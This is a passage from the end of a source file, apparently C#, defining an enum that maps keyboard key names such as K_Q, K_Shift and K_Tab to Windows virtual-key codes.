            K_Q = 0x51,
            K_R = 0x52,
            K_RAlt = 0xa5,
            K_RControl = 0xa3,
            K_Return = 13,
            K_Right = 0x27,
            K_RShift = 0xa1,
            K_RWin = 0x5c,
            K_S = 0x53,
            K_Shift = 0x10,
            K_Space = 0x20,
            K_Subtract = 0xbd,
            K_T = 0x54,
            K_Tab = 9,
            K_U = 0x55,
            K_Up = 0x26,
            K_V = 0x56,
            K_W = 0x57,
            K_X = 0x58,
            K_Y = 0x59,
            K_Z = 90
        }
    }
}

